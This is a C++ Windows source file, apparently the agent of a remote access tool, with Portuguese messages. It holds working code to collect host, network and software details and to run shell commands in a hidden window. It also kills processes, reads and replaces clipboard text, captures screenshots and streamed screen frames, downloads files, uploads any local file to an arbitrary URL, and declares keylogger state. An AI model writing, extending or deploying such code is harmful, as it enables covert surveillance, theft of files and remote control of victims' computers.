#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif

#include <string>
#include <vector>
#include <sstream>
#include <iomanip>
#include <fstream>

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <shlobj.h>
#include <gdiplus.h>
#include <objidl.h>
#include <wininet.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <lm.h>
#include <wincrypt.h>

#include "../include/agent_functions.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "crypt32.lib")

static std::string g_keylogData;
static bool g_keylogActive = false;
static HANDLE g_keylogThread = NULL;

std::string jsonEscape(const std::string& s) {
    std::string out;
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    _snprintf_s(buf, sizeof(buf), _TRUNCATE, "\\u%04x", c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

static std::string wstrToStr(const std::wstring& w) {
    if (w.empty()) return {};
    int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (sz <= 0) return {};
    std::string s(sz - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, nullptr, nullptr);
    return s;
}

static std::wstring strToWstr(const std::string& s) {
    if (s.empty()) return {};
    int sz = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    if (sz <= 0) return {};
    std::wstring w(sz - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], sz);
    return w;
}

static std::string formatBytes(ULONGLONG bytes) {
    const char* units[] = { "B", "KB", "MB", "GB", "TB" };
    int i = 0;
    double val = static_cast<double>(bytes);
    while (val >= 1024.0 && i < 4) { val /= 1024.0; ++i; }
    std::ostringstream ss;
    ss << std::fixed << std::setprecision(1) << val << " " << units[i];
    return ss.str();
}

static std::string formatFileTime(const FILETIME& ft) {
    SYSTEMTIME st;
    FileTimeToSystemTime(&ft, &st);
    char buf[32];
    _snprintf_s(buf, sizeof(buf), _TRUNCATE, "%04d-%02d-%02d %02d:%02d",
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
    return buf;
}

static const char B64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

std::string base64Encode(const std::vector<BYTE>& data) {
    std::string out;
    size_t len = data.size();
    for (size_t i = 0; i < len; i += 3) {
        BYTE b0 = data[i];
        BYTE b1 = (i + 1 < len) ? data[i + 1] : 0;
        BYTE b2 = (i + 2 < len) ? data[i + 2] : 0;
        out += B64[b0 >> 2];
        out += B64[((b0 & 3) << 4) | (b1 >> 4)];
        out += (i + 1 < len) ? B64[((b1 & 0xF) << 2) | (b2 >> 6)] : '=';
        out += (i + 2 < len) ? B64[b2 & 63] : '=';
    }
    return out;
}

std::string base64Decode(const std::string& encoded) {
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[B64[i]] = i;
    std::string out;
    int val = 0, valb = -8;
    for (unsigned char c : encoded) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            out.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return out;
}

std::string getSysInfoJson() {
    char hostname[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD hnLen = static_cast<DWORD>(sizeof(hostname));
    GetComputerNameA(hostname, &hnLen);

    char username[256] = {};
    DWORD unLen = static_cast<DWORD>(sizeof(username));
    GetUserNameA(username, &unLen);

    std::string osStr = "Windows";
    {
        OSVERSIONINFOEXW osvi;
        ZeroMemory(&osvi, sizeof(osvi));
        osvi.dwOSVersionInfoSize = sizeof(osvi);
        typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
        HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
        if (hMod) {
            RtlGetVersionPtr fn = reinterpret_cast<RtlGetVersionPtr>(
                GetProcAddress(hMod, "RtlGetVersion"));
            if (fn) {
                fn(reinterpret_cast<PRTL_OSVERSIONINFOW>(&osvi));
                std::ostringstream ss;
                ss << "Windows " << osvi.dwMajorVersion << "."
                   << osvi.dwMinorVersion << " Build " << osvi.dwBuildNumber;
                osStr = ss.str();
            }
        }
    }

#ifdef _WIN64
    const char* arch = "x64";
#else
    const char* arch = "x86";
#endif

    char cpuName[256] = {};
    DWORD cpuLen = static_cast<DWORD>(sizeof(cpuName));
    RegGetValueA(HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        "ProcessorNameString", RRF_RT_REG_SZ, nullptr, cpuName, &cpuLen);

    SYSTEM_INFO si;
    ZeroMemory(&si, sizeof(si));
    GetSystemInfo(&si);

    MEMORYSTATUSEX ms;
    ZeroMemory(&ms, sizeof(ms));
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);

    char ipBuf[64] = "127.0.0.1";
    {
        ULONG bufLen = 15000;
        std::vector<BYTE> adapterBuf(bufLen);
        DWORD ret = GetAdaptersAddresses(AF_INET,
            GAA_FLAG_SKIP_ANYCAST, nullptr,
            reinterpret_cast<PIP_ADAPTER_ADDRESSES>(adapterBuf.data()),
            &bufLen);
        if (ret == NO_ERROR) {
            PIP_ADAPTER_ADDRESSES pAddr =
                reinterpret_cast<PIP_ADAPTER_ADDRESSES>(adapterBuf.data());
            while (pAddr) {
                if (pAddr->OperStatus == IfOperStatusUp &&
                    pAddr->IfType    != IF_TYPE_SOFTWARE_LOOPBACK &&
                    pAddr->FirstUnicastAddress) {
                    SOCKADDR* sa = pAddr->FirstUnicastAddress->Address.lpSockaddr;
                    if (sa->sa_family == AF_INET) {
                        struct sockaddr_in* sin =
                            reinterpret_cast<struct sockaddr_in*>(sa);
                        InetNtopA(AF_INET, &sin->sin_addr, ipBuf, sizeof(ipBuf));
                        break;
                    }
                }
                pAddr = pAddr->Next;
            }
        }
    }

    char cwd[MAX_PATH] = {};
    GetCurrentDirectoryA(MAX_PATH, cwd);

    ULONGLONG uptimeSec = GetTickCount64() / 1000;
    char uptimeBuf[64];
    _snprintf_s(uptimeBuf, sizeof(uptimeBuf), _TRUNCATE, "%lluh %llum",
                uptimeSec / 3600, (uptimeSec % 3600) / 60);

    std::ostringstream jsonOut;
    jsonOut << "{"
            << "\"hostname\":\"" << jsonEscape(hostname) << "\","
            << "\"username\":\"" << jsonEscape(username) << "\","
            << "\"os\":\""       << jsonEscape(osStr)    << "\","
            << "\"arch\":\""     << arch                 << "\","
            << "\"cpu\":\""      << jsonEscape(cpuName)  << "\","
            << "\"cores\":"      << si.dwNumberOfProcessors << ","
            << "\"ram_total\":\"" << formatBytes(ms.ullTotalPhys) << "\","
            << "\"ram_free\":\""  << formatBytes(ms.ullAvailPhys) << "\","
            << "\"ip\":\""        << jsonEscape(ipBuf)   << "\","
            << "\"uptime\":\""    << jsonEscape(uptimeBuf) << "\","
            << "\"cwd\":\""       << jsonEscape(cwd)     << "\""
            << "}";
    return jsonOut.str();
}

std::string getProcessListJson() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "[]";

    PROCESSENTRY32 pe;
    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);

    std::ostringstream jsonOut;
    jsonOut << "[";
    bool first = true;

    if (Process32First(snap, &pe)) {
        do {
            SIZE_T memKB = 0;
            HANDLE hProc = OpenProcess(
                PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ,
                FALSE, pe.th32ProcessID);
            if (hProc) {
                PROCESS_MEMORY_COUNTERS pmc;
                ZeroMemory(&pmc, sizeof(pmc));
                if (GetProcessMemoryInfo(hProc, &pmc, sizeof(pmc)))
                    memKB = pmc.WorkingSetSize / 1024;
                CloseHandle(hProc);
            }

            if (!first) jsonOut << ",";
            first = false;

            std::string name(pe.szExeFile);
            jsonOut << "{\"pid\":"   << pe.th32ProcessID
                    << ",\"name\":\"" << jsonEscape(name) << "\""
                    << ",\"mem_kb\":" << static_cast<unsigned long long>(memKB)
                    << "}";

        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    jsonOut << "]";
    return jsonOut.str();
}

std::string listDirectoryJson(const std::string& dirPath) {
    std::string searchPath = dirPath;
    if (!searchPath.empty() && searchPath.back() != '\\') searchPath += '\\';
    searchPath += '*';

    WIN32_FIND_DATAA fd;
    ZeroMemory(&fd, sizeof(fd));
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return "[]";

    std::ostringstream jsonOut;
    jsonOut << "[";
    bool first = true;

    do {
        std::string name(fd.cFileName);
        if (name == "." || name == "..") continue;

        bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

        std::string fullPath = dirPath;
        if (!fullPath.empty() && fullPath.back() != '\\') fullPath += '\\';
        fullPath += name;

        ULONGLONG fileSize = isDir ? 0ULL :
            (static_cast<ULONGLONG>(fd.nFileSizeHigh) << 32) | fd.nFileSizeLow;

        std::string modified = formatFileTime(fd.ftLastWriteTime);
        std::string sizeStr  = isDir ? "" : formatBytes(fileSize);

        if (!first) jsonOut << ",";
        first = false;

        jsonOut << "{"
                << "\"name\":\""     << jsonEscape(name)     << "\","
                << "\"path\":\""     << jsonEscape(fullPath)  << "\","
                << "\"type\":\""     << (isDir ? "dir" : "file") << "\","
                << "\"size\":\""     << jsonEscape(sizeStr)   << "\","
                << "\"modified\":\"" << jsonEscape(modified)  << "\""
                << "}";

    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
    jsonOut << "]";
    return jsonOut.str();
}

std::string execCommand(const std::string& cmd) {
    std::string fullCmd = "cmd.exe /C " + cmd + " 2>&1";

    SECURITY_ATTRIBUTES sa;
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength        = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hReadPipe = nullptr;
    HANDLE hWritePipe = nullptr;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return "Erro ao criar pipe.";

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA siProc;
    ZeroMemory(&siProc, sizeof(siProc));
    siProc.cb          = sizeof(siProc);
    siProc.hStdOutput  = hWritePipe;
    siProc.hStdError   = hWritePipe;
    siProc.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    siProc.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    std::vector<char> cmdBuf(fullCmd.begin(), fullCmd.end());
    cmdBuf.push_back('\0');

    if (!CreateProcessA(nullptr, cmdBuf.data(), nullptr, nullptr,
                        TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &siProc, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "Erro ao criar processo.";
    }

    CloseHandle(hWritePipe);

    std::string output;
    char buf[4096];
    DWORD bytesRead = 0;
    while (ReadFile(hReadPipe, buf, sizeof(buf) - 1, &bytesRead, nullptr) &&
           bytesRead > 0) {
        buf[bytesRead] = '\0';
        output += buf;
    }

    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    for (size_t i = 0; i < output.size(); ) {
        if (output[i] == '\r') {
            output.erase(i, 1);
        } else {
            ++i;
        }
    }
    if (!output.empty() && output.back() == '\n')
        output.pop_back();

    return output;
}

std::string killProcess(DWORD pid) {
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProc) {
        char buf[64];
        _snprintf_s(buf, sizeof(buf), _TRUNCATE,
                    "Falha ao abrir processo PID %lu (erro %lu)", pid, GetLastError());
        return buf;
    }
    BOOL ok = TerminateProcess(hProc, 1);
    CloseHandle(hProc);
    char buf[64];
    if (ok) {
        _snprintf_s(buf, sizeof(buf), _TRUNCATE, "Processo %lu encerrado.", pid);
    } else {
        _snprintf_s(buf, sizeof(buf), _TRUNCATE,
                    "Falha ao encerrar PID %lu (erro %lu)", pid, GetLastError());
    }
    return buf;
}

std::string getNetworkInfoJson() {
    ULONG bufLen = 20000;
    std::vector<BYTE> adapterBuf(bufLen);
    DWORD ret = GetAdaptersAddresses(
        AF_UNSPEC,
        GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST,
        nullptr,
        reinterpret_cast<PIP_ADAPTER_ADDRESSES>(adapterBuf.data()),
        &bufLen);
    if (ret != NO_ERROR) return "[]";

    std::ostringstream jsonOut;
    jsonOut << "[";
    bool firstAdapter = true;

    PIP_ADAPTER_ADDRESSES pAddr =
        reinterpret_cast<PIP_ADAPTER_ADDRESSES>(adapterBuf.data());

    while (pAddr) {
        std::string friendlyName = wstrToStr(pAddr->FriendlyName);
        std::string adapterName  = wstrToStr(pAddr->Description);

        char macBuf[32] = "N/A";
        if (pAddr->PhysicalAddressLength > 0) {
            _snprintf_s(macBuf, sizeof(macBuf), _TRUNCATE,
                "%02X:%02X:%02X:%02X:%02X:%02X",
                pAddr->PhysicalAddress[0], pAddr->PhysicalAddress[1],
                pAddr->PhysicalAddress[2], pAddr->PhysicalAddress[3],
                pAddr->PhysicalAddress[4], pAddr->PhysicalAddress[5]);
        }

        const char* status = (pAddr->OperStatus == IfOperStatusUp) ? "Up" : "Down";

        std::string ips;
        PIP_ADAPTER_UNICAST_ADDRESS pUnicast = pAddr->FirstUnicastAddress;
        while (pUnicast) {
            char ipBuf[64] = {};
            SOCKADDR* sa = pUnicast->Address.lpSockaddr;
            if (sa->sa_family == AF_INET) {
                InetNtopA(AF_INET,
                    &reinterpret_cast<struct sockaddr_in*>(sa)->sin_addr,
                    ipBuf, sizeof(ipBuf));
            } else if (sa->sa_family == AF_INET6) {
                InetNtopA(AF_INET6,
                    &reinterpret_cast<struct sockaddr_in6*>(sa)->sin6_addr,
                    ipBuf, sizeof(ipBuf));
            }
            if (strlen(ipBuf) > 0) {
                if (!ips.empty()) ips += ", ";
                ips += ipBuf;
            }
            pUnicast = pUnicast->Next;
        }

        std::string gateway;
        PIP_ADAPTER_GATEWAY_ADDRESS pGw = pAddr->FirstGatewayAddress;
        if (pGw) {
            char gwBuf[64] = {};
            SOCKADDR* sa = pGw->Address.lpSockaddr;
            if (sa->sa_family == AF_INET)
                InetNtopA(AF_INET,
                    &reinterpret_cast<struct sockaddr_in*>(sa)->sin_addr,
                    gwBuf, sizeof(gwBuf));
            gateway = gwBuf;
        }

        if (!firstAdapter) jsonOut << ",";
        firstAdapter = false;

        jsonOut << "{"
                << "\"name\":\""        << jsonEscape(friendlyName) << "\","
                << "\"description\":\"" << jsonEscape(adapterName)  << "\","
                << "\"mac\":\""         << jsonEscape(macBuf)       << "\","
                << "\"status\":\""      << status                   << "\","
                << "\"ips\":\""         << jsonEscape(ips)          << "\","
                << "\"gateway\":\""     << jsonEscape(gateway)      << "\""
                << "}";

        pAddr = pAddr->Next;
    }

    jsonOut << "]";
    return jsonOut.str();
}

std::string getInstalledSoftwareJson() {
    auto sanitize = [](const std::string& s) -> std::string {
        std::string out;
        out.reserve(s.size());
        for (unsigned char c : s) {
            if (c == 0) break;
            if (c >= 0x20 || c == '\t')
                out += static_cast<char>(c);
        }
        size_t start = out.find_first_not_of(" \t");
        if (start == std::string::npos) return "";
        size_t end = out.find_last_not_of(" \t");
        return out.substr(start, end - start + 1);
    };

    const struct { HKEY hive; const char* path; } regKeys[] = {
        { HKEY_LOCAL_MACHINE,
          "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" },
        { HKEY_LOCAL_MACHINE,
          "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" },
        { HKEY_CURRENT_USER,
          "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" },
    };

    std::ostringstream jsonOut;
    jsonOut << "[";
    bool first = true;

    for (const auto& entry : regKeys) {
        HKEY hKey = nullptr;
        LONG rc = RegOpenKeyExA(entry.hive, entry.path, 0,
                                KEY_READ | KEY_WOW64_64KEY, &hKey);
        if (rc != ERROR_SUCCESS) continue;

        char  subkeyName[512] = {};
        DWORD subkeyLen       = static_cast<DWORD>(sizeof(subkeyName));
        DWORD index           = 0;

        while (RegEnumKeyExA(hKey, index++, subkeyName, &subkeyLen,
                             nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
            subkeyLen = static_cast<DWORD>(sizeof(subkeyName));

            HKEY hSub = nullptr;
            if (RegOpenKeyExA(hKey, subkeyName, 0,
                              KEY_READ | KEY_WOW64_64KEY, &hSub) != ERROR_SUCCESS)
                continue;

            auto readStr = [&](const char* valueName) -> std::string {
                char   buf[1024] = {};
                DWORD  len  = static_cast<DWORD>(sizeof(buf) - 1);
                DWORD  type = 0;
                LONG   r    = RegQueryValueExA(hSub, valueName, nullptr,
                                               &type,
                                               reinterpret_cast<LPBYTE>(buf),
                                               &len);
                if (r != ERROR_SUCCESS) return "";
                if (type != REG_SZ && type != REG_EXPAND_SZ) return "";
                buf[len] = '\0';
                return sanitize(buf);
            };

            std::string name    = readStr("DisplayName");
            std::string version = readStr("DisplayVersion");
            std::string pub     = readStr("Publisher");
            std::string date    = readStr("InstallDate");

            RegCloseKey(hSub);

            if (name.empty()) continue;

            if (!first) jsonOut << ",";
            first = false;

            jsonOut << "{"
                    << "\"name\":\""      << jsonEscape(name)    << "\","
                    << "\"version\":\""   << jsonEscape(version) << "\","
                    << "\"publisher\":\"" << jsonEscape(pub)     << "\","
                    << "\"date\":\""      << jsonEscape(date)    << "\""
                    << "}";
        }

        RegCloseKey(hKey);
    }

    jsonOut << "]";
    return jsonOut.str();
}

std::string getClipboardText() {
    if (!OpenClipboard(nullptr)) return "";
    std::string result;
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData) {
        char* pText = static_cast<char*>(GlobalLock(hData));
        if (pText) {
            result = pText;
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();
    return result;
}

std::string setClipboardText(const std::string& text) {
    if (!OpenClipboard(nullptr)) return "Falha ao abrir clipboard.";
    EmptyClipboard();
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
    if (!hMem) { CloseClipboard(); return "Falha ao alocar memória."; }
    char* pMem = static_cast<char*>(GlobalLock(hMem));
    if (pMem) {
        memcpy(pMem, text.c_str(), text.size() + 1);
        GlobalUnlock(hMem);
    }
    SetClipboardData(CF_TEXT, hMem);
    CloseClipboard();
    return "Clipboard atualizado.";
}

static int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num  = 0;
    UINT size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;
    std::vector<BYTE> buf(size);
    Gdiplus::ImageCodecInfo* pInfo =
        reinterpret_cast<Gdiplus::ImageCodecInfo*>(buf.data());
    Gdiplus::GetImageEncoders(num, size, pInfo);
    for (UINT i = 0; i < num; ++i) {
        if (wcscmp(pInfo[i].MimeType, format) == 0) {
            *pClsid = pInfo[i].Clsid;
            return static_cast<int>(i);
        }
    }
    return -1;
}

std::string captureFrameBase64(int quality, int scalePercent) {
    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR token = 0;
    Gdiplus::GdiplusStartup(&token, &gsi, nullptr);

    int srcW = GetSystemMetrics(SM_CXSCREEN);
    int srcH = GetSystemMetrics(SM_CYSCREEN);

    int dstW = srcW * scalePercent / 100;
    int dstH = srcH * scalePercent / 100;
    if (dstW < 1) dstW = 1;
    if (dstH < 1) dstH = 1;

    HDC     hScreenDC = GetDC(nullptr);
    HDC     hSrcDC    = CreateCompatibleDC(hScreenDC);
    HDC     hDstDC    = CreateCompatibleDC(hScreenDC);
    HBITMAP hSrcBmp   = CreateCompatibleBitmap(hScreenDC, srcW, srcH);
    HBITMAP hDstBmp   = CreateCompatibleBitmap(hScreenDC, dstW, dstH);

    SelectObject(hSrcDC, hSrcBmp);
    SelectObject(hDstDC, hDstBmp);

    BitBlt(hSrcDC, 0, 0, srcW, srcH, hScreenDC, 0, 0, SRCCOPY);

    SetStretchBltMode(hDstDC, HALFTONE);
    StretchBlt(hDstDC, 0, 0, dstW, dstH,
               hSrcDC,  0, 0, srcW, srcH, SRCCOPY);

    std::string result;
    {
        Gdiplus::Bitmap bmp(hDstBmp, nullptr);

        CLSID jpegClsid;
        if (GetEncoderClsid(L"image/jpeg", &jpegClsid) >= 0) {
            Gdiplus::EncoderParameters encParams;
            encParams.Count = 1;
            encParams.Parameter[0].Guid           = Gdiplus::EncoderQuality;
            encParams.Parameter[0].Type           = Gdiplus::EncoderParameterValueTypeLong;
            encParams.Parameter[0].NumberOfValues = 1;
            ULONG qualVal = static_cast<ULONG>(quality);
            encParams.Parameter[0].Value = &qualVal;

            IStream* iStream = nullptr;
            if (SUCCEEDED(CreateStreamOnHGlobal(nullptr, TRUE, &iStream))) {
                bmp.Save(iStream, &jpegClsid, &encParams);
                HGLOBAL hg = nullptr;
                GetHGlobalFromStream(iStream, &hg);
                SIZE_T  sz    = GlobalSize(hg);
                LPVOID  pData = GlobalLock(hg);
                if (pData && sz > 0) {
                    std::vector<BYTE> imgBuf(
                        static_cast<BYTE*>(pData),
                        static_cast<BYTE*>(pData) + sz);
                    result = base64Encode(imgBuf);
                }
                GlobalUnlock(hg);
                iStream->Release();
            }
        }
    }

    DeleteObject(hSrcBmp);
    DeleteObject(hDstBmp);
    DeleteDC(hSrcDC);
    DeleteDC(hDstDC);
    ReleaseDC(nullptr, hScreenDC);
    Gdiplus::GdiplusShutdown(token);

    return result;
}

std::string captureScreenshotBase64() {
    Gdiplus::GdiplusStartupInput gsi;
    ULONG_PTR token = 0;
    Gdiplus::GdiplusStartup(&token, &gsi, nullptr);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    HDC     hScreenDC = GetDC(nullptr);
    HDC     hMemDC    = CreateCompatibleDC(hScreenDC);
    HBITMAP hBmp      = CreateCompatibleBitmap(hScreenDC, screenW, screenH);
    SelectObject(hMemDC, hBmp);
    BitBlt(hMemDC, 0, 0, screenW, screenH, hScreenDC, 0, 0, SRCCOPY);

    std::string result;
    {
        Gdiplus::Bitmap bmp(hBmp, nullptr);
        CLSID pngClsid;
        if (GetEncoderClsid(L"image/png", &pngClsid) >= 0) {
            IStream* iStream = nullptr;
            if (SUCCEEDED(CreateStreamOnHGlobal(nullptr, TRUE, &iStream))) {
                bmp.Save(iStream, &pngClsid, nullptr);
                HGLOBAL hg = nullptr;
                GetHGlobalFromStream(iStream, &hg);
                SIZE_T sz    = GlobalSize(hg);
                LPVOID pData = GlobalLock(hg);
                if (pData && sz > 0) {
                    std::vector<BYTE> imgBuf(
                        static_cast<BYTE*>(pData),
                        static_cast<BYTE*>(pData) + sz);
                    result = base64Encode(imgBuf);
                }
                GlobalUnlock(hg);
                iStream->Release();
            }
        }
    }

    DeleteObject(hBmp);
    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreenDC);
    Gdiplus::GdiplusShutdown(token);

    return result;
}

std::string getDiskInfoJson() {
    DWORD drives = GetLogicalDrives();
    std::ostringstream jsonOut;
    jsonOut << "[";
    bool first = true;
    
    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (drives & (1 << (drive - 'A'))) {
            char root[] = { drive, ':', '\\', '\0' };
            UINT type = GetDriveTypeA(root);
            
            const char* typeStr = "Unknown";
            if (type == DRIVE_FIXED) typeStr = "Fixed";
            else if (type == DRIVE_REMOVABLE) typeStr = "Removable";
            else if (type == DRIVE_REMOTE) typeStr = "Network";
            else if (type == DRIVE_CDROM) typeStr = "CD-ROM";
            
            ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
            std::string totalStr = "N/A", freeStr = "N/A";
            if (GetDiskFreeSpaceExA(root, &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
                totalStr = formatBytes(totalBytes.QuadPart);
                freeStr = formatBytes(totalFreeBytes.QuadPart);
            }
            
            char volumeName[MAX_PATH] = {};
            GetVolumeInformationA(root, volumeName, MAX_PATH, nullptr, nullptr, nullptr, nullptr, 0);
            
            if (!first) jsonOut << ",";
            first = false;
            
            jsonOut << "{"
                    << "\"drive\":\"" << root << "\","
                    << "\"type\":\"" << typeStr << "\","
                    << "\"label\":\"" << jsonEscape(volumeName) << "\","
                    << "\"total\":\"" << totalStr << "\","
                    << "\"free\":\"" << freeStr << "\""
                    << "}";
        }
    }
    
    jsonOut << "]";
    return jsonOut.str();
}

std::string getStartupProgramsJson() {
    std::ostringstream jsonOut;
    jsonOut << "[";
    bool first = true;
    
    const struct { HKEY hive; const char* path; } regKeys[] = {
        { HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
        { HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run" },
    };
    
    for (const auto& entry : regKeys) {
        HKEY hKey = nullptr;
        if (RegOpenKeyExA(entry.hive, entry.path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char valueName[512] = {};
            DWORD valueNameLen = sizeof(valueName);
            char valueData[2048] = {};
            DWORD valueDataLen = sizeof(valueData);
            DWORD index = 0;
            DWORD type = 0;
            
            while (RegEnumValueA(hKey, index++, valueName, &valueNameLen, nullptr, &type,
                                 reinterpret_cast<LPBYTE>(valueData), &valueDataLen) == ERROR_SUCCESS) {
                if (!first) jsonOut << ",";
                first = false;
                
                jsonOut << "{"
                        << "\"name\":\"" << jsonEscape(valueName) << "\","
                        << "\"command\":\"" << jsonEscape(valueData) << "\","
                        << "\"location\":\"" << (entry.hive == HKEY_CURRENT_USER ? "HKCU" : "HKLM") << "\""
                        << "}";
                
                valueNameLen = sizeof(valueName);
                valueDataLen = sizeof(valueData);
            }
            RegCloseKey(hKey);
        }
    }
    
    jsonOut << "]";
    return jsonOut.str();
}

std::string downloadFile(const std::string& url, const std::string& destPath) {
    HINTERNET hInternet = InternetOpenA("Agent", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInternet) return "Falha ao inicializar WinINet.";
    
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), nullptr, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return "Falha ao abrir URL.";
    }
    
    std::ofstream outFile(destPath, std::ios::binary);
    if (!outFile) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return "Falha ao criar arquivo de destino.";
    }
    
    char buffer[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        outFile.write(buffer, bytesRead);
    }
    
    outFile.close();
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return "Download concluído: " + destPath;
}

std::string uploadFile(const std::string& srcPath, const std::string& url) {
    std::ifstream inFile(srcPath, std::ios::binary);
    if (!inFile) return "Falha ao abrir arquivo de origem.";
    
    std::vector<char> fileData((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();
    
    HINTERNET hInternet = InternetOpenA("Agent", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInternet) return "Falha ao inicializar WinINet.";
    
    URL_COMPONENTSA urlComp;
    ZeroMemory(&urlComp, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    char hostname[256] = {};
    char urlPath[1024] = {};
    urlComp.lpszHostName = hostname;
    urlComp.dwHostNameLength = sizeof(hostname);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath);
    
    if (!InternetCrackUrlA(url.c_str(), 0, 0, &urlComp)) {
        InternetCloseHandle(hInternet);
        return "URL inválida.";
    }
    
    HINTERNET hConnect = InternetConnectA(hInternet, hostname, urlComp.nPort, nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "Falha ao conectar ao servidor.";
    }
    
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", urlPath, nullptr, nullptr, nullptr, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "Falha ao criar requisição HTTP.";
    }
    
    BOOL result = HttpSendRequestA(hRequest, "Content-Type: application/octet-stream\r\n", -1, fileData.data(), fileData.size());
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    return result ? "Upload concluído." : "Falha no upload.";
}

std::string readFileBase64(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file) return "";
    
    std::vector<BYTE> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    
    return base64Encode(data);
}

